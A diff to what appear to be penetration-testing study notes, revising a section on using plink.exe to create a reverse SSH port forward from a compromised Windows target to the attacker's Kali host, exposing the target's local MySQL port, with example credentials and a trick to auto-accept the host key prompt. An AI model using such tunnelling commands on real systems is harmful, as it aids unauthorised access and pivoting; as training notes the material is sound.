@@ -3277,13 +3277,14 @@ HTTP POST Attack
 
 ### <ins>Plix.exe</ins>
 
-`plink.exe -ssh -l tidus -pw hasford -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
-- `-ssh` connect via SSH
-- `10.11.0.4` to our machine
-- `-l tidus` as the `tidus` user
-- `-pw hasford` using the password `hasford`
-- `-R` to create a remote port forward of `10.11.0.4:1234`
-- `127.0.0.1:3306` to the MySQL port on the Windows target
+The general format is: `plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>`
+- An example: `plink.exe -ssh -l tidus -pw hasford -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
+  - `-ssh` connect via SSH
+  - `10.11.0.4` to our machine
+  - `-l tidus` as the `tidus` user
+  - `-pw hasford` using the password `hasford`
+  - `-R` to create a remote port forward of `10.11.0.4:1234`
+  - `127.0.0.1:3306` to the MySQL port on the Windows target
 
 The first time plink connects to a host, it will attempt to cache the host key in the registry. For this reason, we should pipe the answer to the prompt with the `cmd.exe /c echo y` command. The final result will look like `cmd.exe /c echo y | plink.exe -ssh -l tidus -pw hasford -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`.
 
